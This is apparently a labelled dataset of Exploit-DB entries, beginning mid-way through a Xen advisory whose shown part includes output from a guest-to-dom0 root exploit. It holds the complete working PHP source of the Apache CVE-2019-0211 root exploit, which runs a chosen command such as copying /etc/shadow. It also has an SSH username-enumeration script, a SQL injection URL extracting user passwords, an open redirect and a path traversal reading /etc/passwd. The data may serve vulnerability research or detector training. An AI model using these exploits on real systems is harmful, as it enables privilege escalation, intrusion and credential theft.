/root/crashpoc/native.asm   LD [M]  /root/crashpoc/test.o   Building modules, stage 2.   MODPOST 1 modules WARNING: could not find /root/crashpoc/.native.o.cmd for /root/crashpoc/native.o   CC      /root/crashpoc/test.mod.o   LD [M]  /root/crashpoc/test.ko make: Leaving directory '/usr/src/linux-headers-4.4.0-66-generic' root@pv-guest:~/crashpoc# insmod test.ko root@pv-guest:~/crashpoc# rmmod test  The machine on which I tested the PoC was running Xen 4.6.0-1ubuntu4 (from Ubuntu 16.04.2). Executing the PoC caused the following console output:  (XEN) *** DOUBLE FAULT *** (XEN) ----[ Xen-4.6.0  x86_64  debug=n  Tainted:    C ]---- (XEN) CPU:    0 (XEN) RIP:    e033:[<0000557b46f56860>] 0000557b46f56860 (XEN) RFLAGS: 0000000000010202   CONTEXT: hypervisor (XEN) rax: 00007fffe9cfafd0   rbx: 00007fffe9cfd160   rcx: 0000557b47ebd040 (XEN) rdx: 0000000000000001   rsi: 0000000000000004   rdi: 0000557b47ec52e0 (XEN) rbp: 00007fffe9cfd158   rsp: 00007fffe9cfaf30   r8:  0000557b46f7df00 (XEN) r9:  0000557b46f7dec0   r10: 0000557b46f7df00   r11: 0000557b47ec5878 (XEN) r12: 0000557b47ebd040   r13: 00007fffe9cfb0c0   r14: 0000557b47ec52e0 (XEN) r15: 0000557b47ed5e70   cr0: 0000000080050033   cr4: 00000000001506a0 (XEN) cr3: 0000000098e2e000   cr2: 00007fffe9cfaf93 (XEN) ds: 0000   es: 0000   fs: 0000   gs: 0000   ss: e02b   cs: e033 (XEN)  (XEN) **************************************** (XEN) Panic on CPU 0: (XEN) DOUBLE FAULT -- system shutdown (XEN) **************************************** (XEN)  (XEN) Reboot in five seconds...   I strongly recommend changing the semantics of access_ok() so that it guarantees that any access to an address inside the specified range is valid. Alternatively, add some prefix, e.g. ""UNSAFE_"", to the names of access_ok() and appropriate wrappers to prevent people from using these functions improperly. Currently, in my opinion, the function name access_ok() is misleading.  Proof of Concept: xen_memory_exchange_crashpoc.tar   ################################################################################  I have written an exploit (attached).  Usage (in an unprivileged PV guest with kernel headers, gcc, make, nasm and hexdump):   root@pv-guest:~/privesc_poc# ./compile.sh  make: Entering directory '/usr/src/linux-headers-4.4.0-66-generic'   LD      /root/privesc_poc/built-in.o   CC [M]  /root/privesc_poc/module.o nasm -f elf64 -o /root/privesc_poc/native.o /root/privesc_poc/native.asm   LD [M]  /root/privesc_poc/test.o   Building modules, stage 2.   MODPOST 1 modules WARNING: could not find /root/privesc_poc/.native.o.cmd for /root/privesc_poc/native.o   CC      /root/privesc_poc/test.mod.o   LD [M]  /root/privesc_poc/test.ko make: Leaving directory '/usr/src/linux-headers-4.4.0-66-generic' root@pv-guest:~/privesc_poc# ./attack 'id > /tmp/owned_by_the_guest'                                                                                        press enter to continue <press enter> root@pv-guest:~/privesc_poc#     dmesg in the unprivileged PV guest:   [  721.413415] call_int_85 at 0xffffffffc0075a90 [  721.420167] backstop_85_handler at 0xffffffffc0075a93 [  722.801566] PML4 at ffff880002fe3000 [  722.808216] PML4 entry: 0x13bba4067 [  722.816161] ### trying to write crafted PUD entry... [  722.824178] ### writing byte 0 [  722.832193] write_byte_hyper(ffff88007a491008, 0x7) [  722.840254] write_byte_hyper successful [  722.848234] ### writing byte 1 [  722.856170] write_byte_hyper(ffff88007a491009, 0x80) [  722.864219] write_byte_hyper successful [  722.872241] ### writing byte 2 [  722.880215] write_byte_hyper(ffff88007a49100a, 0x35) [  722.889014] write_byte_hyper successful [  722.896232] ### writing byte 3 [  722.904265] write_byte_hyper(ffff88007a49100b, 0x6) [  722.912599] write_byte_hyper successful [  722.920246] ### writing byte 4 [  722.928270] write_byte_hyper(ffff88007a49100c, 0x0) [  722.938554] write_byte_hyper successful [  722.944231] ### writing byte 5 [  722.952239] write_byte_hyper(ffff88007a49100d, 0x0) [  722.961769] write_byte_hyper successful [  722.968221] ### writing byte 6 [  722.976219] write_byte_hyper(ffff88007a49100e, 0x0) [  722.984319] write_byte_hyper successful [  722.992233] ### writing byte 7 [  723.000234] write_byte_hyper(ffff88007a49100f, 0x0) [  723.008341] write_byte_hyper successful [  723.016254] ### writing byte 8 [  723.024357] write_byte_hyper(ffff88007a491010, 0x0) [  723.032254] write_byte_hyper successful [  723.040236] ### crafted PUD entry written [  723.048199] dummy [  723.056199] going to link PMD into target PUD [  723.064238] linked PMD into target PUD [  723.072206] going to unlink mapping via userspace PUD [  723.080230] mapping unlink done [  723.088251] copying HV and user shellcode... [  723.096283] copied HV and user shellcode [  723.104270] int 0x85 returned 0x7331 [  723.112237]   remapping paddr 0x13bb86000 to vaddr 0xffff88000355a800 [  723.120192] IDT entry for 0x80 should be at 0xffff83013bb86800 [  723.128226] remapped IDT entry for 0x80 to 0xffff804000100800 [  723.136260] IDT entry for 0x80: addr=0xffff82d08022a3d0, selector=0xe008, ist=0x0, p=1, dpl=3, s=0, type=15 [  723.144291] int 0x85 returned 0x1337 [  723.152235] === END ===   The supplied shell command executes in dom0 (and all other 64bit PV domains):   root@ubuntu:~# cat /tmp/owned_by_the_guest  uid=0(root) gid=0(root) groups=0(root) root@ubuntu:~#    Note that the exploit doesn't clean up after itself - shutting down the attacking domain will panic the hypervisor.   I have tested the exploit in the following configurations:  configuration 1: running inside VMware Workstation Xen version ""Xen version 4.6.0 (Ubuntu 4.6.0-1ubuntu4.3)"" dom0: Ubuntu 16.04.2, Linux 4.8.0-41-generic #44~16.04.1-Ubuntu unprivileged guest: Ubuntu 16.04.2, Linux 4.4.0-66-generic #87-Ubuntu  configuration 2: running on a physical machine with Qubes OS 3.1 installed Xen version 4.6.3  Proof of Concept: privesc_poc.tar.gz   ################################################################################  Proofs of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41870.zip","[""'memory_exchange()'""]",1
46676,"Apache 2.4.17 < 2.4.38 - 'apache2ctl graceful' 'logrotate' Local Privilege Escalation <?php # CARPE (DIEM): CVE-2019-0211 Apache Root Privilege Escalation # Charles Fol # @cfreal_ # 2019-04-08 # # INFOS # # https://cfreal.github.io/carpe-diem-cve-2019-0211-apache-local-root.html # # USAGE # # 1. Upload exploit to Apache HTTP server # 2. Send request to page # 3. Await 6:25AM for logrotate to restart Apache # 4. python3.5 is now suid 0 # # You can change the command that is ran as root using the cmd HTTP # parameter (GET/POST). # Example: curl http://localhost/carpediem.php?cmd=cp+/etc/shadow+/tmp/ # # SUCCESS RATE # # Number of successful and failed exploitations relative to of the number # of MPM workers (i.e. Apache subprocesses). YMMV. # # W  --% S   F #  5 87% 177 26 (default) #  8 89%  60  8 # 10 95%  70  4 # # More workers, higher success rate. # By default (5 workers), 87% success rate. With huge HTTPds, close to 100%. # Generally, failure is due to all_buckets being relocated too far from its # original address. # # TESTED ON # # - Apache/2.4.25 # - PHP 7.2.12 # - Debian GNU/Linux 9.6 # # TESTING # # $ curl http://localhost/cfreal-carpediem.php # $ sudo /usr/sbin/logrotate /etc/logrotate.conf --force # $ ls -alh /usr/bin/python3.5 # -rwsr-sr-x 2 root root 4.6M Sep 27  2018 /usr/bin/python3.5 # # There are no hardcoded addresses. # - Addresses read through /proc/self/mem # - Offsets read through ELF parsing # # As usual, there are tons of comments. #   o('CARPE (DIEM) ~ CVE-2019-0211'); o('');  error_reporting(E_ALL);   # Starts the exploit by triggering the UAF. function real() { 	global $y; 	$y = [new Z()]; 	json_encode([0 => &$y]); }  # In order to read/write what comes after in memory, we need to UAF a string so # that we can control its size and make in-place edition. # An easy way to do that is to replace the string by a timelib_rel_time # structure of which the first bytes can be reached by the (y, m, d, h, i, s) # properties of the DateInterval object. # # Steps: # - Create a base object (Z) # - Add string property (abc) so that sizeof(abc) = sizeof(timelib_rel_time) # - Create DateInterval object ($place) meant to be unset and filled by another # - Trigger the UAF by unsetting $y[0], which is still reachable using $this # - Unset $place: at this point, if we create a new DateInterval object, it will #   replace $place in memory # - Create a string ($holder) that fills $place's timelib_rel_time structure # - Allocate a new DateInterval object: its timelib_rel_time structure will #   end up in place of abc # - Now we can control $this->abc's zend_string structure entirely using #   y, m, d etc. # - Increase abc's size so that we can read/write memory that comes after it, #   especially the shared memory block # - Find out all_buckets' position by finding a memory region that matches the #   mutex->meth structure # - Compute the bucket index required to reach the SHM and get an arbitrary #   function call # - Scan ap_scoreboard_image->parent[] to find workers' PID and replace the #   bucket class Z implements JsonSerializable { 	public function jsonSerialize() 	{ 		global $y, $addresses, $workers_pids;  		# 		# Setup memory 		#         o('Triggering UAF'); 		o('  Creating room and filling empty spaces');  		# Fill empty blocks to make sure our allocations will be contiguous 		# I: Since a lot of allocations/deallocations happen before the script 		# is ran, two variables instanciated at the same time might not be 		# contiguous: this can be a problem for a lot of reasons. 		# To avoid this, we instanciate several DateInterval objects. These 		# objects will fill a lot of potentially non-contiguous memory blocks, 		# ensuring we get ""fresh memory"" in upcoming allocations. 		$contiguous = []; 		for($i=0;$i<10;$i++) 			$contiguous[] = new DateInterval('PT1S');  		# Create some space for our UAF blocks not to get overwritten 		# I: A PHP object is a combination of a lot of structures, such as 		# zval, zend_object, zend_object_handlers, zend_string, etc., which are 		# all allocated, and freed when the object is destroyed. 		# After the UAF is triggered on the object, all the structures that are 		# used to represent it will be marked as free. 		# If we create other variables afterwards, those variables might be 		# allocated in the object's previous memory regions, which might pose 		# problems for the rest of the exploitation. 		# To avoid this, we allocate a lot of objects before the UAF, and free 		# them afterwards. Since PHP's heap is LIFO, when we create other vars, 		# they will take the place of those objects instead of the object we 		# are triggering the UAF on. This means our object is ""shielded"" and 		# we don't have to worry about breaking it. 		$room = []; 		for($i=0;$i<10;$i++) 			$room[] = new Z();  		# Build string meant to fill old DateInterval's timelib_rel_time 		# I: ptr2str's name is unintuitive here: we just want to allocate a 		# zend_string of size 78. 		$_protector = ptr2str(0, 78);  		o('  Allocating $abc and $p');  		# Create ABC 		# I: This is the variable we will use to R/W memory afterwards. 		# After we free the Z object, we'll make sure abc is overwritten by a 		# timelib_rel_time structure under our control. The first 8*8 = 64 bytes 		# of this structure can be modified easily, meaning we can change the 		# size of abc. This will allow us to read/write memory after abc. 		$this->abc = ptr2str(0, 79);  		# Create $p meant to protect $this's blocks 		# I: Right after we trigger the UAF, we will unset $p. 		# This means that the timelib_rel_time structure (TRT) of this object 		# will be freed. We will then allocate a string ($protector) of the same 		# size as TRT. Since PHP's heap is LIFO, the string will take the place 		# of the now-freed TRT in memory. 		# Then, we create a new DateInterval object ($x). From the same 		# assumption, every structure constituting this new object will take the 		# place of the previous structure. Nevertheless, since TRT's memory 		# block has already been replaced by $protector, the new TRT will be put 		# in the next free blocks of the same size, which happens to be $abc 		# (remember, |abc| == |timelib_rel_time|). 		# We now have the following situation: $x is a DateInterval object whose 		# internal TRT structure has the same address as $abc's zend_string. 		$p = new DateInterval('PT1S');  		# 		# Trigger UAF 		# 		 		o('  Unsetting both variables and setting $protector'); 		# UAF here, $this is usable despite being freed 		unset($y[0]); 		# Protect $this's freed blocks 		unset($p);  		# Protect $p's timelib_rel_time structure 		$protector = "".$_protector""; 		# !!! This is only required for apache 		# Got no idea as to why there is an extra deallocation (?) 		$room[] = ""!$_protector"";  		o('  Creating DateInterval object'); 		# After this line: 		# &((php_interval_obj) x).timelib_rel_time == ((zval) abc).value.str 		# We can control the structure of $this->abc and therefore read/write 		# anything that comes after it in memory by changing its size and 		# making in-place edits using $this->abc[$position] = $char 		$x = new DateInterval('PT1S'); 		# zend_string.refcount = 0 		# It will get incremented at some point, and if it is > 1, 		# zend_assign_to_string_offset() will try to duplicate it before making 		# the in-place replacement 		$x->y = 0x00; 		# zend_string.len 		$x->d = 0x100; 		# zend_string.val[0-4] 		$x->h = 0x13121110;  		# Verify UAF was successful 		# We modified stuff via $x; they should be visible by $this->abc, since 		# they are at the same memory location. 		if(!( 			strlen($this->abc) === $x->d && 			$this->abc[0] == ""\x10"" && 			$this->abc[1] == ""\x11"" && 			$this->abc[2] == ""\x12"" && 			$this->abc[3] == ""\x13"" 		)) 		{ 			o('UAF failed, exiting.'); 			exit(); 		} 		o('UAF successful.'); 		o('');  		# Give us some room 		# I: As indicated before, just unset a lot of stuff so that next allocs 		# don't break our fragile UAFd structure. 		unset($room);  		# 		# Setup the R/W primitive 		#  		# We control $abc's internal zend_string structure, therefore we can R/W 		# the shared memory block (SHM), but for that we need to know the 		# position of $abc in memory 		# I: We know the absolute position of the SHM, so we need to need abc's 		# as well, otherwise we cannot compute the offset  		# Assuming the allocation was contiguous, memory looks like this, with 		# 0x70-sized fastbins: 		# 	[zend_string:abc] 		# 	[zend_string:protector] 		# 	[FREE#1] 		# 	[FREE#2] 		# Therefore, the address of the 2nd free block is in the first 8 bytes 		# of the first block: 0x70 * 2 - 24 		$address = str2ptr($this->abc, 0x70 * 2 - 24); 		# The address we got points to FREE#2, hence we're |block| * 3 higher in 		# memory 		$address = $address - 0x70 * 3; 		# The beginning of the string is 24 bytes after its origin 		$address = $address + 24; 		o('Address of $abc: 0x' . dechex($address)); 		o('');  		# Compute the size required for our string to include the whole SHM and 		# apache's memory region 		$distance =  			max($addresses['apache'][1], $addresses['shm'][1]) - 			$address 		; 		$x->d = $distance;  		# We can now read/write in the whole SHM and apache's memory region.  		# 		# Find all_buckets in memory 		#  		# We are looking for a structure s.t. 		# |all_buckets, mutex| = 0x10 		# |mutex, meth| = 0x8 		# all_buckets is in apache's memory region 		# mutex is in apache's memory region 		# meth is in libaprR's memory region 		# meth's function pointers are in libaprX's memory region 		o('Looking for all_buckets in memory'); 		$all_buckets = 0;  		for( 			$i = $addresses['apache'][0] + 0x10; 			$i < $addresses['apache'][1] - 0x08; 			$i += 8 		) 		{ 			# mutex 			$mutex = $pointer = str2ptr($this->abc, $i - $address); 			if(!in($pointer, $addresses['apache'])) 				continue;   			# meth 			$meth = $pointer = str2ptr($this->abc, $pointer + 0x8 - $address); 			if(!in($pointer, $addresses['libaprR'])) 				continue;  			o('  [&mutex]: 0x' . dechex($i)); 			o('    [mutex]: 0x' . dechex($mutex)); 			o('      [meth]: 0x' . dechex($meth));   			# meth->* 			# flags 			if(str2ptr($this->abc, $pointer - $address) != 0) 				continue; 			# methods 			for($j=0;$j<7;$j++) 			{ 				$m = str2ptr($this->abc, $pointer + 0x8 + $j * 8 - $address); 				if(!in($m, $addresses['libaprX'])) 					continue 2; 				o('        [*]: 0x' . dechex($m)); 			}  			$all_buckets = $i - 0x10; 			o('all_buckets = 0x' . dechex($all_buckets)); 			break; 		}  		if(!$all_buckets) 		{ 			o('Unable to find all_buckets'); 			exit(); 		}  		o('');  		# The address of all_buckets will change when apache is gracefully 		# restarted. This is a problem because we need to know all_buckets's 		# address in order to make all_buckets[some_index] point to a memory 		# region we control.  		# 		# Compute potential bucket indexes and their addresses 		#          o('Computing potential bucket indexes and addresses');  		# Since we have sizeof($workers_pid) MPM workers, we can fill the rest 		# of the ap_score_image->servers items, so 256 - sizeof($workers_pids), 		# with data we like. We keep the one at the top to store our payload. 		# The rest is sprayed with the address of our payload.  		$size_prefork_child_bucket = 24; 		$size_worker_score = 264; 		# I get strange errors if I use every ""free"" item, so I leave twice as 		# many items free. I'm guessing upon startup some 		$spray_size = $size_worker_score * (256 - sizeof($workers_pids) * 2); 		$spray_max = $addresses['shm'][1]; 		$spray_min = $spray_max - $spray_size;  		$spray_middle = (int) (($spray_min + $spray_max) / 2); 		$bucket_index_middle = (int) ( 			- ($all_buckets - $spray_middle) / 			$size_prefork_child_bucket 		);  		# 		# Build payload 		#  		# A worker_score structure was kept empty to put our payload in 		$payload_start = $spray_min - $size_worker_score;  		$z = ptr2str(0);      	# Payload maxsize 264 - 112 = 152 		# Offset 8 cannot be 0, but other than this you can type whatever 		# command you want     	$bucket = isset($_REQUEST['cmd']) ?     		$_REQUEST['cmd'] :     		""chmod +s /usr/bin/python3.5"";      	if(strlen($bucket) > $size_worker_score - 112) 		{ 			o( 				'Payload size is bigger than available space (' . 				($size_worker_score - 112) . 				'), exiting.' 			); 			exit(); 		}     	# Align     	$bucket = str_pad($bucket, $size_worker_score - 112, ""\x00"");      	# apr_proc_mutex_unix_lock_methods_t 		$meth =  		    $z . 		    $z . 		    $z . 		    $z . 		    $z . 		    $z . 			# child_init 		    ptr2str($addresses['zend_object_std_dtor']) 		;  		# The second pointer points to meth, and is used before reaching the 		# arbitrary function call 		# The third one and the last one are both used by the function call 		# zend_object_std_dtor(object) => ... => system(&arData[0]->val) 		$properties =  			# refcount 			ptr2str(1) . 			# u-nTableMask meth 			ptr2str($payload_start + strlen($bucket)) . 			# Bucket arData 			ptr2str($payload_start) . 			# uint32_t nNumUsed; 			ptr2str(1, 4) . 		    # uint32_t nNumOfElements; 			ptr2str(0, 4) . 			# uint32_t nTableSize 			ptr2str(0, 4) . 			# uint32_t nInternalPointer 			ptr2str(0, 4) . 			# zend_long nNextFreeElement 			$z . 			# dtor_func_t pDestructor 			ptr2str($addresses['system']) 		;  		$payload = 			$bucket . 			$meth . 			$properties 		;  		# Write the payload  		o('Placing payload at address 0x' . dechex($payload_start));  		$p = $payload_start - $address; 		for( 			$i = 0; 			$i < strlen($payload); 			$i++ 		) 		{ 			$this->abc[$p+$i] = $payload[$i]; 		}  		# Fill the spray area with a pointer to properties 		 		$properties_address = $payload_start + strlen($bucket) + strlen($meth); 		o('Spraying pointer'); 		o('  Address: 0x' . dechex($properties_address)); 		o('  From: 0x' . dechex($spray_min)); 		o('  To: 0x' . dechex($spray_max)); 		o('  Size: 0x' . dechex($spray_size)); 		o('  Covered: 0x' . dechex($spray_size * count($workers_pids))); 		o('  Apache: 0x' . dechex( 			$addresses['apache'][1] - 			$addresses['apache'][0] 		));  		$s_properties_address = ptr2str($properties_address);  		for( 			$i = $spray_min; 			$i < $spray_max; 			$i++ 		) 		{ 			$this->abc[$i - $address] = $s_properties_address[$i % 8]; 		} 		o('');  		# Find workers PID in the SHM: it indicates the beginning of their 		# process_score structure. We can then change process_score.bucket to 		# the index we computed. When apache reboots, it will use 		# all_buckets[ap_scoreboard_image->parent[i]->bucket]->mutex 		# which means we control the whole apr_proc_mutex_t structure. 		# This structure contains pointers to multiple functions, especially 		# mutex->meth->child_init(), which will be called before privileges 		# are dropped. 		# We do this for every worker PID, incrementing the bucket index so that 		# we cover a bigger range. 		 		o('Iterating in SHM to find PIDs...');  		# Number of bucket indexes covered by our spray 		$spray_nb_buckets = (int) ($spray_size / $size_prefork_child_bucket); 		# Number of bucket indexes covered by our spray and the PS structures 		$total_nb_buckets = $spray_nb_buckets * count($workers_pids); 		# First bucket index to handle 		$bucket_index = $bucket_index_middle - (int) ($total_nb_buckets / 2);  		# Iterate over every process_score structure until we find every PID or 		# we reach the end of the SHM 		for( 			$p = $addresses['shm'][0] + 0x20; 			$p < $addresses['shm'][1] && count($workers_pids) > 0; 			$p += 0x24 		) 		{ 			$l = $p - $address; 			$current_pid = str2ptr($this->abc, $l, 4); 			o('Got PID: ' . $current_pid); 			# The PID matches one of the workers 			if(in_array($current_pid, $workers_pids)) 			{ 				unset($workers_pids[$current_pid]); 				o('  PID matches'); 				# Update bucket address 				$s_bucket_index = pack('l', $bucket_index); 				$this->abc[$l + 0x20] = $s_bucket_index[0]; 				$this->abc[$l + 0x21] = $s_bucket_index[1]; 				$this->abc[$l + 0x22] = $s_bucket_index[2]; 				$this->abc[$l + 0x23] = $s_bucket_index[3]; 				o('  Changed bucket value to ' . $bucket_index); 				$min = $spray_min - $size_prefork_child_bucket * $bucket_index; 				$max = $spray_max - $size_prefork_child_bucket * $bucket_index; 				o('  Ranges: 0x' . dechex($min) . ' - 0x' . dechex($max)); 				# This bucket range is covered, go to the next one 				$bucket_index += $spray_nb_buckets; 			} 		}  		if(count($workers_pids) > 0) 		{ 			o( 				'Unable to find PIDs ' . 				implode(', ', $workers_pids) . 				' in SHM, exiting.' 			); 			exit(); 		}  		o(''); 		o('EXPLOIT SUCCESSFUL.'); 		o('Await 6:25AM.'); 		 		return 0; 	} }  function o($msg) { 	# No concatenation -> no string allocation 	print($msg); 	print(""\n""); }  function ptr2str($ptr, $m=8) { 	$out = """";     for ($i=0; $i<$m; $i++)     {         $out .= chr($ptr & 0xff);         $ptr >>= 8;     }     return $out; }  function str2ptr(&$str, $p, $s=8) { 	$address = 0; 	for($j=$s-1;$j>=0;$j--) 	{ 		$address <<= 8; 		$address |= ord($str[$p+$j]); 	} 	return $address; }  function in($i, $range) { 	return $i >= $range[0] && $i < $range[1]; }  /**  * Finds the offset of a symbol in a file.  */ function find_symbol($file, $symbol) {     $elf = file_get_contents($file);     $e_shoff = str2ptr($elf, 0x28);     $e_shentsize = str2ptr($elf, 0x3a, 2);     $e_shnum = str2ptr($elf, 0x3c, 2);      $dynsym_off = 0;     $dynsym_sz = 0;     $dynstr_off = 0;      for($i=0;$i<$e_shnum;$i++)     {         $offset = $e_shoff + $i * $e_shentsize;         $sh_type = str2ptr($elf, $offset + 0x04, 4);          $SHT_DYNSYM = 11;         $SHT_SYMTAB = 2;         $SHT_STRTAB = 3;          switch($sh_type)         {             case $SHT_DYNSYM:                 $dynsym_off = str2ptr($elf, $offset + 0x18, 8);                 $dynsym_sz = str2ptr($elf, $offset + 0x20, 8);                 break;             case $SHT_STRTAB:             case $SHT_SYMTAB:                 if(!$dynstr_off)                     $dynstr_off = str2ptr($elf, $offset + 0x18, 8);                 break;         }      }      if(!($dynsym_off && $dynsym_sz && $dynstr_off))         exit('.');      $sizeof_Elf64_Sym = 0x18;      for($i=0;$i * $sizeof_Elf64_Sym < $dynsym_sz;$i++)     {         $offset = $dynsym_off + $i * $sizeof_Elf64_Sym;         $st_name = str2ptr($elf, $offset, 4);                  if(!$st_name)             continue;                  $offset_string = $dynstr_off + $st_name;         $end = strpos($elf, ""\x00"", $offset_string) - $offset_string;         $string = substr($elf, $offset_string, $end);          if($string == $symbol)         {             $st_value = str2ptr($elf, $offset + 0x8, 8);             return $st_value;         }     }      die('Unable to find symbol ' . $symbol); }  # Obtains the addresses of the shared memory block and some functions through  # /proc/self/maps # This is hacky as hell. function get_all_addresses() { 	$addresses = []; 	$data = file_get_contents('/proc/self/maps'); 	$follows_shm = false;  	foreach(explode(""\n"", $data) as $line) 	{ 		if(!isset($addresses['shm']) && strpos($line, '/dev/zero')) 		{             $line = explode(' ', $line)[0];             $bounds = array_map('hexdec', explode('-', $line));             if ($bounds[1] - $bounds[0] == 0x14000)             {                 $addresses['shm'] = $bounds;                 $follows_shm = true;             }         } 		if( 			preg_match('#(/[^\s]+libc-[0-9.]+.so[^\s]*)#', $line, $matches) && 			strpos($line, 'r-xp') 		) 		{ 			$offset = find_symbol($matches[1], 'system'); 			$line = explode(' ', $line)[0]; 			$line = hexdec(explode('-', $line)[0]); 			$addresses['system'] = $line + $offset; 		} 		if( 			strpos($line, 'libapr-1.so') && 			strpos($line, 'r-xp') 		) 		{ 			$line = explode(' ', $line)[0]; 			$bounds = array_map('hexdec', explode('-', $line)); 			$addresses['libaprX'] = $bounds; 		} 		if( 			strpos($line, 'libapr-1.so') && 			strpos($line, 'r--p') 		) 		{ 			$line = explode(' ', $line)[0]; 			$bounds = array_map('hexdec', explode('-', $line)); 			$addresses['libaprR'] = $bounds; 		} 		# Apache's memory block is between the SHM and ld.so 		# Sometimes some rwx region gets mapped; all_buckets cannot be in there 		# but we include it anyways for the sake of simplicity 		if( 			( 				strpos($line, 'rw-p') || 				strpos($line, 'rwxp') 			) &&             $follows_shm 		) 		{             if(strpos($line, '/lib'))             {                 $follows_shm = false;                 continue;             } 			$line = explode(' ', $line)[0]; 			$bounds = array_map('hexdec', explode('-', $line)); 			if(!array_key_exists('apache', $addresses)) 			    $addresses['apache'] = $bounds; 			else if($addresses['apache'][1] == $bounds[0])                 $addresses['apache'][1] = $bounds[1]; 			else                 $follows_shm = false; 		} 		if( 			preg_match('#(/[^\s]+libphp7[0-9.]+.so[^\s]*)#', $line, $matches) && 			strpos($line, 'r-xp') 		) 		{ 			$offset = find_symbol($matches[1], 'zend_object_std_dtor'); 			$line = explode(' ', $line)[0]; 			$line = hexdec(explode('-', $line)[0]); 			$addresses['zend_object_std_dtor'] = $line + $offset; 		} 	}  	$expected = [ 		'shm', 'system', 'libaprR', 'libaprX', 'apache', 'zend_object_std_dtor' 	]; 	$missing = array_diff($expected, array_keys($addresses));  	if($missing) 	{ 		o( 			'The following addresses were not determined by parsing ' . 			'/proc/self/maps: ' . implode(', ', $missing) 		); 		exit(0); 	}   	o('PID: ' . getmypid()); 	o('Fetching addresses');  	foreach($addresses as $k => $a) 	{ 		if(!is_array($a)) 			$a = [$a]; 		o('  ' . $k . ': ' . implode('-0x', array_map(function($z) { 				return '0x' . dechex($z); 		}, $a))); 	} 	o('');  	return $addresses; }  # Extracts PIDs of apache workers using /proc/*/cmdline and /proc/*/status, # matching the cmdline and the UID function get_workers_pids() { 	o('Obtaining apache workers PIDs'); 	$pids = []; 	$cmd = file_get_contents('/proc/self/cmdline'); 	$processes = glob('/proc/*'); 	foreach($processes as $process) 	{ 		if(!preg_match('#^/proc/([0-9]+)$#', $process, $match)) 			continue; 		$pid = (int) $match[1]; 		if( 			!is_readable($process . '/cmdline') || 			!is_readable($process . '/status') 		) 			continue; 		if($cmd !== file_get_contents($process . '/cmdline')) 			continue;  		$status = file_get_contents($process . '/status'); 		foreach(explode(""\n"", $status) as $line) 		{ 			if( 				strpos($line, 'Uid:') === 0 && 				preg_match('#\b' . posix_getuid() . '\b#', $line) 			) 			{ 				o('  Found apache worker: ' . $pid); 				$pids[$pid] = $pid; 				break; 			}  		} 	} 	 	o('Got ' . sizeof($pids) . ' PIDs.'); 	o('');  	return $pids; }  $addresses = get_all_addresses(); $workers_pids = get_workers_pids(); real();","[""'apache2ctl"", ""'logrotate'""]",1
3303,"Portable OpenSSH 3.6.1p-PAM/4.1-SuSE - Timing Attack #!/bin/bash  # # $Id: raptor_sshtime,v 1.1 2007/02/13 16:38:57 raptor Exp $ # # raptor_sshtime - [Open]SSH remote timing attack exploit # Copyright (c) 2006 Marco Ivaldi <raptor@0xdeadbeef.info> # # OpenSSH-portable 3.6.1p1 and earlier with PAM support enabled immediately  # sends an error message when a user does not exist, which allows remote  # attackers to determine valid usernames via a timing attack (CVE-2003-0190). # # OpenSSH portable 4.1 on SUSE Linux, and possibly other platforms and versions, # and possibly under limited configurations, allows remote attackers to  # determine valid usernames via timing discrepancies in which responses take  # longer for valid usernames than invalid ones, as demonstrated by sshtime.  # NOTE: as of 20061014, it appears that this issue is dependent on the use of  # manually-set passwords that causes delays when processing /etc/shadow due to  # an increased number of rounds (CVE-2006-5229). #  # This is a simple shell script based on expect meant to remotely analyze  # timing differences in sshd ""Permission denied"" replies. Depending on OpenSSH  # version and configuration, it may lead to disclosure of valid usernames.  # # Usage example:  # [make sure the target hostkey has been approved before] # ./sshtime 192.168.0.1 dict.txt #  # Some vars port=22  # Command line host=$1 dict=$2  # Local functions function head() { 	echo """" 	echo ""raptor_sshtime - [Open]SSH remote timing attack exploit"" 	echo ""Copyright (c) 2006 Marco Ivaldi <raptor@0xdeadbeef.info>"" 	echo """" }  function foot() { 	echo """" 	exit 0 } 	 function usage() { 	head 	echo ""[make sure the target hostkey has been approved before]"" 	echo """" 	echo ""usage  : ./sshtime <target> <wordlist>"" 	echo ""example: ./sshtime 192.168.0.1 dict.txt"" 	foot }  function notfound() { 	head 	echo ""error  : expect interpreter not found!"" 	foot }  # Check if expect is there expect=`which expect 2>/dev/null` if [ $? -ne 0 ]; then 	notfound fi  # Input control if [ -z ""$2""  ]; then 	usage fi  # Perform the bruteforce attack head  for user in `cat $dict` do 	echo -ne ""$user@$host\t\t"" 	(time -p $expect -c ""log_user 0; spawn -noecho ssh -p $port $host -l $user; for {} 1 {} {expect -nocase \""password*\"" {send \""dummy\r\""} eof {exit}}"") 2>&1 | grep real done  foot  # milw0rm.com [2007-02-13]",['sshd'],1
635,"MiniBB 1.7f - 'user' SQL Injection Example:   http://[target]/minibb/index.php?action=userinfo&user=1%20union%20select%201,2,user_password%20from%20minibb_users/*   # milw0rm.com [2004-11-16]","[""'user'""]",1
36848,Tiki Wiki CMS Groupware - 'url' Open Redirection source: https://www.securityfocus.com/bid/52079/info  Tiki Wiki CMS Groupware is prone to a URI-redirection vulnerability because the application fails to properly sanitize user-supplied input.  A successful exploit may aid in phishing attacks; other attacks are possible.   http://www.example.com/tiki-featured_link.php?type=f&url=http://www.example2.com,"[""'url'""]",1
31083,Nilson's Blogger 0.11 - 'comments.php' Local File Inclusion source: https://www.securityfocus.com/bid/27559/info  Nilson's Blogger is prone to a local file-include vulnerability because it fails to properly sanitize user-supplied input.  An attacker can exploit this vulnerability using directory-traversal strings to include local files in the context of the webserver process. This may allow the attacker to obtain potentially sensitive information; other attacks are also possible.  This issue affects Nilson's Blogger 0.11; other versions may also be vulnerable.   http://www.example.com/comments.php?thispost=../../../../../../../../../../etc/passwd,"[""'comments.php'""]",1
